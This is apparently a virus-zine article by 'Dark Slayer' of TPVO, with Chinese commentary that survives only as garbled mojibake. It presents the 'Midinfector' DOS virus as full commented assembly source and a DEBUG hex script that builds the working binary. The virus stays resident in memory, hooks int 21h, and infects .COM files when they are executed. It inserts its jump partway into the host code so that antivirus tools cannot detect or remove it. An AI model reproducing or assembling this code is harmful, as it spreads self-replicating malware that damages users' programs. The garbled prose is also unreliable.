
                                                                     P.010

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                Ææ  Midinfector Virus  Ææ               Vo
         pT                                                        OT
         VP                     by Dark Slayer                     VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


       ¶â¡T¤j®a¤@©w³£»{¬°¤ÀªRµ{¦¡½X (¬Æ¦Ü¼ÒÀÀ) ¬O¨¾¬rµ{¦¡ªº±M§Q§a¡S¨ä¹ê
       ³o¼Ë¦nª±ªºªF¦è¤]¥i¥HÀ³¥Î¦b¯f¬r¤Wªº¡A¥»½g¤å³¹ªº¬r´N¬O§Ú§Q¥Î¤ÀªRµ{
       ¦¡½Xªº¥\¯à©Ò¼g¥X¨Óªº¬r... ¼K... ¬Ý¨ì³oÃä§A¥i¯à·|·P¨ì¦³ÂIºÃ´b¡A¤£
       ª¾¹D§Ú¦bÁ¿¤°»òªF¦è... ok¡T§Ú¥ÎÂ²³æªºµ{¦¡¨Ó¸ÑÄÀ...

       °²³]¦³¤@­Ó¤T¦æªºµ{¦¡¦p¤U¡R

               mov ax,1234h
               mov bx,5678h
               int 20h

       ¦Ó¤@¯ë¯f¬r­n·P¬VÀÉ®×ªº¤èªk¡A³Ì±`¥Îªº´N¬O¦b¶}ÀY©ñ­Ó jmp xxxx ¡A¸õ
       ¨ì±µ¦bÀÉ§Àªº¯f¬rµ{¦¡¡A¦p¤U¡R

               jmp vir_start   ; mov ax,1234h ³Q»\±¼¤F
               mov bx,5678h
               int 20h
       vir_start:
               ¯f¬rµ{¦¡
                  .
                  .

       ¦ý¬O... ·í³o­ÓÀÉ®×³Q¦¹¬r·P¬V¹L«á±N·|¬O¦p¤U­±ªº¼Ë¤l...

               mov ax,1234h
               mov bx,5678h
               jmp vir_start   ; int 20h ³Q»\±¼¤F

       vir_start:
               ¯f¬rµ{¦¡
                  .
                  .

       ³o®É­Ô´N¦³¤H·|°Ý¡R¡u³o¼Ë·P¬V¦³¦ó¦n³B¡S¡v¡A¶â... ¦n¹³¨S¦³¡A°Ú...
       §Ú·Q¨ì¤F¡A³o¼Ë¯à³y¦¨¸Ñ¬r¤Wªº§xÂZ¡A¼H... ¦]¬°¤Z¬O¤£´M±`ªº¡B¤£·Ó©¹
       ¨Òªº¡Bspecial ªº¬r¤j³¡¥÷ªº¤H¤u´¼¼z±½/¸Ñ ¬rµ{¦¡³£±½¤£¥X¨Ó¡B¸Ñ¤£±¼
       ¡A¦Ó¥B¼g¥X»P²³¤£¦Pªº¬r¤@ª½¬O§Úªø¤[¥H¨Óªº­ì«h... so... kill me :)

;======================= Begin of midinf.asm ================================

vir_size        equ     (offset vir_end-offset start)
mem_size        equ     (offset mem_end-offset start)
mem_para        equ     (mem_size+0fh)/10h

                .model  tiny
                .code
                org     0
start:          pushf           ; Àx¦s©Ò¦³¼È¦s¾¹¤ÎºX¼Ð, ¦]¬°¦¹¬r¬O¦b³Q·P¬Vªº
                cld             ; µ{¦¡°õ¦æ¹L¤@¨Ç«ü¥O«á¤~¨ú±o±±¨îÅvªº, ¬°¤F¤£
                push    ax bx cx dx si di bp ds es      ; ¼vÅT³Q·P¬Vµ{¦¡ªº°õ¦æ
                call    delta   ; ­«©w¦ì, ¨ú±o¦Û¨­ªº offset
delta:          pop     si
                sub     si,offset delta-offset start
                push    si                      ; ¦s°_¨Ó, µ¥¤@¤UÁÙ­n¥Î
                mov     ax,1888h
                int     21h                     ; TSR check
                cmp     ax,'MI'                 ; ÀË¬d¦¹¬r¬O§_±`¾n?
                je      jmp_to_host             ; °õ¦æ­ìµ{¦¡

                mov     ah,4ah
                mov     bx,0ffffh
                int     21h                     ; ¨ú±o¥Ø«e°O¾ÐÅé³Ì¤jªº para
                mov     ah,4ah
                sub     bx,mem_para+1           ; ´î¥h¯f¬r©Ò»Ý
                int     21h                     ; ­×§ï°O¾ÐÅé¤j¤p, ªÅ¥X¤@­ÓªÅ¶¡
                jc      jmp_to_host             ; ¿ù»~´N¤£±`¾n

                xor     di,di
                sub     word ptr ds:[di+2],mem_para+1   ; ­×§ï psp:[2]
                mov     ax,ds
                dec     ax                      ; ax = ds - 1 = MCB segment
                mov     ds,ax                   ; ds = MCB segment
                add     ax,ds:mcb_para_size[di] ; ­pºâ¥Xºò±µµÛ¤U¤@­Ó MCB ªº¦ì§}
                inc     ax
                mov     ds,ax                   ; ds = ¯f¬r±`¾n©Ò¦bªº MCB
                or      word ptr ds:mcb_onwer_seg[di],8 ; §ï¦¹ MCB ¬°¨t²Î©Ò¾Ö¦³
                inc     ax
                mov     es,ax
                mov     cx,vir_size
                rep     movs byte ptr es:[di],cs:[si]   ; ·h®a... ±`¾n©ó¦¹
                mov     ds,cx                   ; rep movsb «á ds = cx = 0
                mov     ax,offset vir_int21     ; ­×§ï int 21h ¤¤Â_¦V¶q
                xchg    ax,ds:[21h*4]
                stosw
                mov     ax,es
                xchg    ax,ds:[21h*4+2]
                stosw
jmp_to_host:    pop     si                      ; ¨ú¥X¦Û¨­ªº offset
                add     si,offset host_code     ; «ü¥O­ìµ{¦¡½X¸ê®Æ
                push    cs cs                   ; ds = es = cs = psp segment
                pop     ds es                   ; ¦]¬°¬O com ÀÉ
                mov     ax,0                    ; ax «ü¦V­ìÀÉ®×³Q­×§ïªº¦a¤è
                org     $-2
host_addr       dw      0
                add     ax,100h
                mov     di,ax
                sub     ax,si                   ; ­pºâ¥X¦¹¬r­n¸õ¦^­ìµ{¦¡ªº¥Øªº
                                                ; ¦a¦ì§}
                mov     ds:jmp_disp-host_code[si],ax    ; Àx¦s¦b 0e9h (jmp) ¾÷
                                                ; ±ñ½X¤§«á
                jmp     $+2                     ; ²M°£ CPU Àx¦C
                movsb                           ; «ì´_­ìµ{¦¡¤º®e
                movsw
                pop     es ds bp di si dx cx bx ax      ; ¨ú¦^¼È¦s¾¹­È
                popf
                db      0e9h                    ; jmp near xxxx ¥h°õ¦æ­ìµ{¦¡
jmp_disp        dw      ?

host_code       db      0cdh,20h,?
msg             db      '  MidInfector by Dark Slayer of [TPVO]  '

infect:         ; ds:dx = file name
                mov     si,dx
                cld
il1:            lodsb                           ; ·j´MÀÉ¦W³Ì«á­±ªº 0
                or      al,al
                jnz     il1
                cmp     byte ptr ds:[si-5],'.'  ; ¢w¢{
                jne     infect_exit             ;   ¢x
                mov     ax,ds:[si-5+1]          ;   ¢x
                and     ax,not 2020h            ;   ¢x
                cmp     ax,'OC'                 ;   ¢u¢w ¤ñ¸û¬O§_¬° .COM??
                jne     infect_exit             ;   ¢x  ¤£¬O´N¤£·P¬V
                mov     al,ds:[si-5+3]          ;   ¢x
                and     al,not 20h              ;   ¢x
                cmp     al,'M'                  ;   ¢x
                jne     infect_exit             ; ¢w¢}
                mov     ah,48h
                mov     bx,1000h
                int     21h                     ; °t¸m 64k °O¾ÐÅé
                jc      infect_exit             ; ¦³¿ù»~!!! Â÷¶}
                push    ax
                mov     ax,3d02h
                int     21h                     ; ¶}ÀÉ
                jc      free_mem                ; ¦³¿ù»~!!! Â÷¶}
                xchg    bx,ax
                pop     ds
                push    ds
                mov     ah,3fh
                mov     cx,0f000h
                cwd
                int     21h                     ; Åª¨ú¦¹ .COM ÀÉ¾ã­Óµ{¦¡½X
                jc      close                   ; ¦³¿ù»~!!! Â÷¶}
                cmp     ax,cx                   ; ÀÉ®×¤Ó¤j??
                je      close                   ; ¶W¹L 0f000h ªº COM ÀÉ¤£·P¬V
                xchg    cx,ax                   ; cx = ax = ÀÉ®×±`«×
                xor     si,si
                mov     ax,ds:[si]              ; ¨úÀÉ®×«e 2 bytes
                xor     al,ah
                cmp     al,'M' xor 'Z'          ; EXE??
                je      close                   ; ¤£·P¬V EXE ÀÉ
                push    bx                      ; ¦s bx (ÀÉ®×¥N½X)
                call    unasm                   ; ¤ÀªRµ{¦¡½X
                pop     bx                      ; ¨ú¦^ÀÉ®×¥N½X
                push    cx                      ; cx = ·P¬V«áªºµ{¦¡½X¤j¤p
                mov     ax,4200h
                xor     cx,cx
                cwd
                int     21h                     ; Åª¼g«ü¼Ð²¾¦ÜÀÉ®×¶}ÀY
                pop     cx                      ; ¨ú¦^µ{¦¡½X¤j¤p
                mov     ah,40h
                int     21h                     ; ¼g¦^ÀÉ®×
close:          mov     ah,3eh
                int     21h                     ; ÃöÀÉ
free_mem:       mov     ah,49h
                pop     es
                int     21h                     ; ÄÀ©ñ©Ò°t¸mªº 64k °O¾ÐÅé
infect_exit:    ret


unasm:          ; si = ¤ÀªR«ü¼Ð («ü¦V¥Ø«e­n¤ÀªRªºµ{¦¡½X°¾²¾)
                ; cx = ­ìÀÉ®×ªø«×
                push    si              ; Àx¦s¥Ø«eªº¤ÀªR«ü¼Ð
                call    ual0            ; ¤ÀªRµ{¦¡½X, ¨Ã¶Ç¦^"ÀË¬d"°Æµ{¦¡ªº¸¹½X
                push    ax              ; ah = °Æµ{¦¡¸¹½X
                mov     al,ah
                cbw
                shl     ax,1
                xchg    di,ax
                pop     ax
                call    word ptr cs:proc_table[di]      ; call ¦¹°Æµ{¦¡
                pop     ax              ; ax = ¨ú¥X¤ÀªR«ü¼Ð
                jc      uaerr           ; cf = 1, ªí¥Ü¹J¨ì¤£À´ªº«ü¥O, ¤£¦AÄ~Äò
                                        ; ¤ÀªR
                cmp     si,cx           ; si >= cx?? (ÀË¬d¬O§_¶W¹L½d³ò)
                jb      unasm           ; ¨S¦³ªº¸Ü, Ä~Äò...
uaerr:          mov     cs:host_addr,ax ; Àx¦s¤ÀªR«ü¼Ðªº¦ì§}
                xchg    si,ax           ; si = ax
                mov     al,0e9h         ; al = 0e9h = jmp near ªº«ü¥O½X
                xchg    al,ds:[si]      ; ±N­n·P¬Vªºµ{¦¡½X§ï¬° jmp
                mov     cs:host_code,al ; Àx¦s­ìµ{¦¡½X
                mov     ax,cx           ; ax = cx = ·P¬V«eªºÀÉ®×ªø«×
                sub     ax,si
                sub     ax,3            ; ºâ¥X±µ¦b 0e9h «áªº­È
                xchg    ax,ds:[si+1]    ; ­×§ï­ìµ{¦¡
                mov     word ptr cs:host_code[1],ax     ; Àx¦s­ìµ{¦¡½X
                mov     di,cx           ; di = cx = ÀÉ®×ªø«×
                push    ds
                pop     es
                xor     si,si
                mov     cx,vir_size
                rep     movs byte ptr es:[di],cs:[si]   ; ±N¯f¬r½X·h¹L¥h
                mov     cx,di           ; cx = ·P¬V«áªºµ{¦¡½X¤j¤p
                ret

ual0:           mov     ah,3            ; °²³]¥ý¨Ï¥Î proc3
                lodsb                   ; ¨úµ{¦¡½X
                test    al,11000100b
                                ; add/or/adc/sbb/and/sub/xor/cmp reg,reg??
                jnz     ual1
                mov     ah,0            ; ­Y¬O«h¥Î proc0
                ret
ual1:           test    al,11000010b
                                ; add/or/adc/sbb/and/sub/xor/cmp al/ax,xxxx??
                jnz     ual2
                test    al,00000100b
                jz      ual2
                mov     ah,1            ; ­Y¬O«h¥Î proc1
                ret
ual2:           test    al,11100000b    ; push/pop segment reg??
                jnz     ual3
                push    ax
                and     al,00000110b
                cmp     al,00000110b
                pop     ax
                jne     ual3
                mov     ah,2            ; ­Y¬O«h¥Î proc2
                ret
ual3:           test    al,11000001b    ; es:/cs:/ss:/ds ??
                jnz     ual4
                push    ax
                and     al,00100110b
                cmp     al,00100110b
                pop     ax
                je      ual4_1          ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual4:           cmp     al,61h  ; daa/das/aaa/aas inc/dec/push/pop reg16
                                ; pusha/popa ???
                ja      ual5
                mov     ah,4            ; ­Y¬O«h¥Î proc4
ual4_1:         ret
ual5:           cmp     al,68h  ; bound/arpl/fs:/gs:/op size:/addr size: ??
                jb      ual4_1          ; ­Y¬O«h¥Î proc3
ual6:           jne     ual7            ; push xxxx (unsigned) ???
                mov     ah,4            ; ­Y¬O«h¥Î proc4
                inc     si              ; ¥B±N«ü¼Ð + 2
                inc     si
                ret
ual7:           cmp     al,6ah  ; imul reg16,reg16/mem,xxxx (unsigned) ??
                jae     ual8
                mov     ah,6            ; ­Y¬O«h¥Î proc6
                ret
ual8:           jne     ual9            ; push xx (signed) ??
                mov     ah,4            ; ­Y¬O«h¥Î proc3
                inc     si              ; ¥B±N«ü¼Ð + 1
                ret
ual9:           cmp     al,6bh          ; imul reg16,reg16/mem,xx (signed) ??
                jne     ual10
                mov     ah,5            ; ­Y¬O«h¥Î proc5
                ret
ual10:          cmp     al,80h          ; insb/insw/outsb/outsw/jxx ??
                jb      ual4_1          ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual11:          jne     ual12
                        ; add/or/adc/sbb/and/sub/xor/cmp reg8/mem8,xx ??
                mov     ah,5            ; ­Y¬O«h¥Î proc5
                ret
ual12:          cmp     al,81h
                        ; add/or/adc/sbb/and/sub/xor/cmp reg16/mem16,xxxx ??
                jne     ual13
                mov     ah,6            ; ­Y¬O«h¥Î proc6
                ret
ual13:          cmp     al,83h
                ; add/or/adc/sbb/and/sub/xor/cmp reg8/mem8,xx  or
                ; add/or/adc/sbb/and/sub/xor/cmp reg16/mem16,xx (signed) ??
                ja      ual14
                mov     ah,5            ; ­Y¬O«h¥Î proc5
                ret
ual14:          cmp     al,8dh  ; test/xchg/mov reg/mem(8/16),reg/mem(8/16) or
                                ; mov reg/mem,segment reg??
                jae     ual15
                mov     ah,0            ; ­Y¬O«h¥Î proc0
                ret
ual15:          je      ual4_1          ; lea reg,[xxxx]/[reg]/[reg+xxxx]???
                                        ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual16:          cmp     al,8fh          ; mov segment reg,reg/mem??
                jae     ual17
                mov     ah,0            ; ­Y¬O«h¥Î proc0
                ret
ual17:          jne     ual18           ; push reg/mem??
                mov     ah,0            ; ­Y¬O«h¥Î proc0
                ret
ual18:          cmp     al,9ah          ; nop/xchg reg,ax/cbw/cwd ??
                jae     ual19
                mov     ah,4            ; ­Y¬O«h¥Î proc4
                ret
ual19:          je      ual4_1          ; call far xxxx:xxxx ??
                                        ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual20:          cmp     al,0a0h         ; wait/pushf/popf/sahf/lahf ??
                jae     ual21
                mov     ah,4            ; ­Y¬O«h¥Î proc4
                ret
ual21:          cmp     al,0a8h ;     mov al/ax,[xxxx]  or  mov [xxxx],al/ax
                                ; or  movsb/movsw/cmpsb/cmpsw ??
                jb      ual4_1          ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual22:          cmp     al,0aah         ; test al/ax,xx/xxxx ??
                jae     ual23
                mov     ah,1            ; ­Y¬O«h¥Î proc1
                ret
ual23:          cmp     al,0b0h         ; stosb/stosw/lodsb/lodsw/scasb/scasw ?
                jb      ual4_1          ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual24:          cmp     al,0b8h         ; mov reg8,xx ??
                jae     ual25
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                inc     si              ; ¥B§â«ü¼Ð + 1
                ret
ual25:          cmp     al,0c0h         ; mov reg16,xxxx ??
                jae     ual26
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                inc     si              ; ¥B§â«ü¼Ð + 2
                inc     si
                ret
ual26:          cmp     al,0c2h ; rol/r/rcl/r/shl/r/sar reg/mem(8/16),xx ??
                jae     ual27
                mov     ah,5            ; ­Y¬O«h¥Î proc5
ual26_1:        ret
ual27:          cmp     al,0cch
                jb      ual26_1         ; retn xxxx/retn les/lds reg,mem
                                        ; mov reg8/reg16,xx/xxxx
                                        ; enter/leave/retf xxxx/retf ??
                                        ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual27_1:        jne     ual27_2         ; int 3 ??
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                ret
ual27_2:        cmp     al,0ceh         ; int xx ??
                jb      ual26_1         ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual27_3:        jne     ual27_4         ; into ??
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                ret
ual27_4:        cmp     al,0d0h         ; iret?
                jb      ual26_1         ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual28:          cmp     al,0d4h ; rol/r/rcl/r/shl/r/sar reg/mem(8/16),1/cl ??
                jae     ual29
                mov     ah,0            ; ­Y¬O«h¨Ï¥Î proc0
                ret
ual29:          cmp     al,0e4h         ; aam/aad/setatc/xlat/esc 0¡ã7/loopne
                                        ; loope/loop/jcxz ??
                jb      ual26_1         ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual30:          cmp     al,0e8h         ; in/out al/ax,xx ??
                jae     ual31
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                inc     si              ; ¥B±N«ü¼Ð + 1
                ret
ual31:          cmp     al,0eah         ; call/jmp near xxxx ??
                jae     ual32
                lodsw                   ; ­Y¬O«h­pºâ¸õÅDªº¥Øªº¦ì§}
                add     si,ax           ; §ó·s«ü¼Ð­È
                mov     ah,4            ; ¨Ï¥Î proc4
                ret
ual32:          je      ual26_1         ; jmp far xxxx:xxxx ??
                                        ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual33:          cmp     al,0ech         ; jmp short xx ??
                jae     ual34
                lodsb                   ; ­Y¬O«h­pºâ¸õÅDªº¥Øªº¦ì§}
                cbw
                add     si,ax           ; §ó·s«ü¼Ð­È
                mov     ah,4            ; ¨Ï¥Î proc4
                ret
ual34:          cmp     al,0f0h         ; in/out al/ax,dx
                jae     ual35
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                inc     si              ; ¥B±N«ü¼Ð + 1
                ret
ual35:          jne     ual36           ; lock ??
ual35_1:        jmp     ual0            ; ¥Ñ©ó lock ¦³©M¤U¤@­Ó«ü¥O³s¦b¤@°_°õ
                                        ; ¦æªº©Ê½è, ©Ò¥H¸õ¦Ü ual0 ¨ú¤U­Ó«ü¥O
                                        ; ¨Ó¤ÀªR
ual36:          cmp     al,0f2h         ; icebp ??
                jae     ual37
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                ret
ual37:          cmp     al,0f4h         ; repne/repe ??
                jb      ual35_1         ; ­Y¬O«h¸õ¦Ü ual0, ©M lock ªº¹D²z¤@¼Ë
                cmp     al,0f6h         ; hlt/cmc ??
                jae     ual38
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
                ret
ual38:          cmp     al,0f8h         ; test/not/neg/mul/imul/div/idiv ??
                jae     ual42
                mov     al,ds:[si]
                push    ax
                and     al,00111000b
                cmp     al,00001000b    ; test ??
                jbe     ual40           ; ¬O«h jmp
                cmp     al,00110000b    ; div/idiv ??
                pop     ax
                jb      ual39           ; ¤£¬O«h jmp (not/neg/mul/imul)
                ret                     ; ­Y¬O«h ret (¨Ï¥Î¤@¶}©l³]ªº proc3)
ual39:          mov     ah,0            ; ¨Ï¥Î proc0
                ret
ual40:          pop     ax
                test    al,1            ; test reg8,xx or test reg16,xxxx ??
                jnz     ual41           ; ­Y¬° word «h jmp
                mov     ah,5            ; ­Y¬O byte «h¥Î proc5
                ret
ual41:          mov     ah,6            ; ­Y¬O word «h¥Î proc6
                ret
ual42:          cmp     al,0feh         ; clc/stc/cli/sti/cld/std ??
                jae     ual43
                mov     ah,4            ; ­Y¬O«h¨Ï¥Î proc4
ual43:          ret                     ; §_«h ret (¥Î¤@©l³]ªº proc3)

; "ÀË¬d" °Æµ{¦¡ªºªí®æ, ³o¨Ç°Æµ{¦¡­Y¶Ç¦^ cf = 1 «hªí¥Ü¹J¨ì¤£¦X®æªº«ü¥O, ¤£­n¦A
; ¤ÀªR¤F...
proc_table      dw      proc0,proc1,proc2,proc3,proc4,proc5,proc6

proc0:          lodsb                   ; °Æµ{¦¡ 0: ÀË¬d¬O§_¬°¼È¦s¾¹
                and     al,0c0h
                cmp     al,0c0h
                je      proc0_ok
proc3:          stc                     ; °Æµ{¦¡ 3: §P¦º¦D¤F, ¤°»ò³£¤£Â²¬d
                                        ;           ´N¤£¤ÀªR
proc0_ok:       ret

proc1:          inc     si              ; °Æµ{¦¡ 1: ­Y¬°¦s¨ú word ªº«ü¥O«h±N
                test    al,1            ;           «ü¼Ð + 1
                jz      proc1_byte
                inc     si
proc1_byte:     ret

proc2:          cmp     al,0fh          ; °Æµ{¦¡ 2: ¤ñ¸û¬O§_¬° 0fh ¶}ÀYªº«ü¥O,
                jne     proc2_ok        ;           ­Y¬O«h¤£¤ÀªR
                stc
                mov     al,0
                org     $-1
proc4:                                  ; °Æµ{¦¡ 4: µL±ø¥ó³q¹L³o­Ó«ü¥O
proc2_ok:       clc
                ret

proc5:          call    proc0           ; °Æµ{¦¡ 5: ÀË¬d¬O§_¬°¼È¦s¾¹, µM«á±N
                jc      proc5_err       ;           «ü¼Ð + 1
                inc     si
proc5_err:      ret

proc6:          call    proc0           ; °Æµ{¦¡ 6: ÀË¬d¬O§_¬°¼È¦s¾¹, µM«á±N
                jc      proc6_err       ;           «ü¼Ð + 2
                inc     si
                inc     si
proc6_err:      ret

vir_int21:      pushf
                cmp     ax,1888h        ; TSR check?
                jne     not_me
                popf
                mov     ax,'MI'         ; §i¶D¦P¦ñ, §Ú¤w¸g±`¾n¤F
                iret
not_me:         cmp     ax,4b00h        ; °õ¦æÀÉ®×??
                jne     vir_int21_exit
                push    ax bx cx dx si di bp ds es
                call    infect          ; ·P¬V¦¹ÀÉ
                pop     es ds bp di si dx cx bx ax
vir_int21_exit: popf
                db      0eah            ; jmp xxxx:xxxx ¸õ¦Ü­ì int 21h
vir_end:
old21           dw      ?,?
mem_end:

mcb             struc
mcb_sign        db      ?
mcb_onwer_seg   dw      ?
mcb_para_size   dw      ?
                db      3 dup(?)
mcb_name        db      8 dup(?)
mcb             ends

                end     start

;======================= End of midinf.asm ==================================

n midinf.com
e 0100 9C FC 50 53 51 52 56 57 55 1E 06 E8 00 00 5E 83
e 0110 EE 0E 56 B8 88 18 CD 21 3D 49 4D 74 3F B4 4A BB
e 0120 FF FF CD 21 B4 4A 83 EB 31 CD 21 72 2F 33 FF 83
e 0130 6D 02 31 8C D8 48 8E D8 03 45 03 40 8E D8 83 4D
e 0140 01 08 40 8E C0 B9 F8 02 F3 2E A4 8E D9 B8 D1 02
e 0150 87 06 84 00 AB 8C C0 87 06 86 00 AB 5E 81 C6 83
e 0160 00 0E 0E 1F 07 B8 00 00 05 00 01 8B F8 2B C6 89
e 0170 44 FE EB 00 A4 A5 07 1F 5D 5F 5E 5A 59 5B 58 9D
e 0180 E9 00 00 CD 20 00 20 20 4D 69 64 49 6E 66 65 63
e 0190 74 6F 72 20 62 79 20 44 61 72 6B 20 53 6C 61 79
e 01A0 65 72 20 6F 66 20 5B 54 50 56 4F 5D 20 20 8B F2
e 01B0 FC AC 0A C0 75 FB 80 7C FB 2E 75 5D 8B 44 FC 25
e 01C0 DF DF 3D 43 4F 75 52 8A 44 FE 24 DF 3C 4D 75 49
e 01D0 B4 48 BB 00 10 CD 21 72 40 50 B8 02 3D CD 21 72
e 01E0 33 93 1F 1E B4 3F B9 00 F0 99 CD 21 72 22 3B C1
e 01F0 74 1E 91 33 F6 8B 04 32 C4 3C 17 74 13 53 E8 19
e 0200 00 5B 51 B8 00 42 33 C9 99 CD 21 59 B4 40 CD 21
e 0210 B4 3E CD 21 B4 49 07 CD 21 C3 56 E8 3E 00 50 8A
e 0220 C4 98 D1 E0 97 58 2E FF 95 9C 02 58 72 04 3B F1
e 0230 72 E8 2E A3 66 00 96 B0 E9 86 04 2E A2 83 00 8B
e 0240 C1 2B C6 2D 03 00 87 44 01 2E A3 84 00 8B F9 1E
e 0250 07 33 F6 B9 F8 02 F3 2E A4 8B CF C3 B4 03 AC A8
e 0260 C4 75 03 B4 00 C3 A8 C2 75 07 A8 04 74 03 B4 01
e 0270 C3 A8 E0 75 0B 50 24 06 3C 06 58 75 03 B4 02 C3
e 0280 A8 C1 75 08 50 24 26 3C 26 58 74 06 3C 61 77 03
e 0290 B4 04 C3 3C 68 72 FB 75 05 B4 04 46 46 C3 3C 6A
e 02A0 73 03 B4 06 C3 75 04 B4 04 46 C3 3C 6B 75 03 B4
e 02B0 05 C3 3C 80 72 DC 75 03 B4 05 C3 3C 81 75 03 B4
e 02C0 06 C3 3C 83 77 03 B4 05 C3 3C 8D 73 03 B4 00 C3
e 02D0 74 C0 3C 8F 73 03 B4 00 C3 75 03 B4 00 C3 3C 9A
e 02E0 73 03 B4 04 C3 74 AB 3C A0 73 03 B4 04 C3 3C A8
e 02F0 72 A0 3C AA 73 03 B4 01 C3 3C B0 72 95 3C B8 73
e 0300 04 B4 04 46 C3 3C C0 73 05 B4 04 46 46 C3 3C C2
e 0310 73 03 B4 05 C3 3C CC 72 FB 75 03 B4 04 C3 3C CE
e 0320 72 F2 75 03 B4 04 C3 3C D0 72 E9 3C D4 73 03 B4
e 0330 00 C3 3C E4 72 DE 3C E8 73 04 B4 04 46 C3 3C EA
e 0340 73 06 AD 03 F0 B4 04 C3 74 CA 3C EC 73 07 AC 98
e 0350 03 F0 B4 04 C3 3C F0 73 04 B4 04 46 C3 75 03 E9
e 0360 FA FE 3C F2 73 03 B4 04 C3 3C F4 72 F2 3C F6 73
e 0370 03 B4 04 C3 3C F8 73 1D 8A 04 50 24 38 3C 08 76
e 0380 09 3C 30 58 72 01 C3 B4 00 C3 58 A8 01 75 03 B4
e 0390 05 C3 B4 06 C3 3C FE 73 02 B4 04 C3 AA 02 B3 02
e 03A0 BA 02 B1 02 C0 02 C2 02 C9 02 AC 24 C0 3C C0 74
e 03B0 01 F9 C3 46 A8 01 74 01 46 C3 3C 0F 75 02 F9 B0
e 03C0 F8 C3 E8 E5 FF 72 01 46 C3 E8 DE FF 72 02 46 46
e 03D0 C3 9C 3D 88 18 75 05 9D B8 49 4D CF 3D 00 4B 75
e 03E0 15 50 53 51 52 56 57 55 1E 06 E8 C1 FD 07 1F 5D
e 03F0 5F 5E 5A 59 5B 58 9D EA
rcx
2F8
w
q

